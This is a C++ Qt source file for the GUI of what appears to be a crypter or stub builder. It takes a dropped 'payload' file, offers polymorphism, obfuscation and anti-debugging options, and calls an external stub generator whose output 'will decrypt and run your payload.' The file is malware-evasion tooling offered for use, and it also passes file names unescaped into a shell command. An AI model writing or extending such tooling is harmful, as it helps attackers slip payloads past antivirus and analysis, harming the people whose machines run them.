#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QFileDialog>
#include <QMessageBox>
#include <QMimeData>
#include <QDragEnterEvent>
#include <QProcess>
#include <QFileInfo>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    setAcceptDrops(true);

    // Connect buttons
    connect(ui->generateButton, &QPushButton::clicked, this, &MainWindow::on_generateButton_clicked);
    connect(ui->polymorphicCheckBox, &QCheckBox::toggled, this, &MainWindow::on_polymorphicCheckBox_toggled);
    connect(ui->obfuscationCheckBox, &QCheckBox::toggled, this, &MainWindow::on_obfuscationCheckBox_toggled);
    connect(ui->antiDebugCheckBox, &QCheckBox::toggled, this, &MainWindow::on_antiDebugCheckBox_toggled);

    // Initialize options
    usePolymorphism = false;
    useObfuscation = false;
    useAntiDebug = false;

    ui->generateButton->setEnabled(false);
    ui->statusLabel->setText("Drag and drop your payload file here...");
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::dragEnterEvent(QDragEnterEvent *event)
{
    if (event->mimeData()->hasUrls())
        event->acceptProposedAction();
}

void MainWindow::dropEvent(QDropEvent *event)
{
    const QMimeData* mimeData = event->mimeData();
    if (mimeData->hasUrls()) {
        auto files = mimeData->urls();
        if (!files.isEmpty()) {
            payloadFile = files[0].toLocalFile();
            ui->payloadLabel->setText("Payload: " + QFileInfo(payloadFile).fileName());
            checkReady();
        }
    }
}

void MainWindow::on_polymorphicCheckBox_toggled(bool checked)
{
    usePolymorphism = checked;
}

void MainWindow::on_obfuscationCheckBox_toggled(bool checked)
{
    useObfuscation = checked;
}

void MainWindow::on_antiDebugCheckBox_toggled(bool checked)
{
    useAntiDebug = checked;
}

void MainWindow::on_generateButton_clicked()
{
    QString outputStub = QFileDialog::getSaveFileName(this, "Save Stub As", "", "C++ Files (*.cpp);;All Files (*)");
    if (outputStub.isEmpty()) return;

    // Determine stub type based on options
    QString stubType = "basic";
    if (usePolymorphism || useObfuscation || useAntiDebug) {
        stubType = "advanced";
    }

    // Build command for native_stub_generator
    QString cmd = QString("./native_stub_generator \"%1\" \"%2\" %3").arg(payloadFile, outputStub, stubType);
    QProcess process;
    process.start(cmd);
    process.waitForFinished();
    int ret = process.exitCode();
    if (ret == 0) {
        QString features = "";
        if (usePolymorphism) features += "• Polymorphism\n";
        if (useObfuscation) features += "• Obfuscation\n";
        if (useAntiDebug) features += "• Anti-debugging\n";
        if (features.isEmpty()) features = "• Basic encryption/decryption\n";
        
        QMessageBox::information(this, "Success", 
            QString("Stub generated successfully!\n\nFeatures enabled:\n%1\nNext steps:\n1. Compile the generated .cpp file\n2. The compiled executable will decrypt and run your payload").arg(features));
    } else {
        QString errorOutput = process.readAllStandardError();
        QMessageBox::critical(this, "Error", "Failed to generate stub.\n\nError details:\n" + errorOutput);
    }
}

void MainWindow::checkReady()
{
    ui->generateButton->setEnabled(!payloadFile.isEmpty());
}
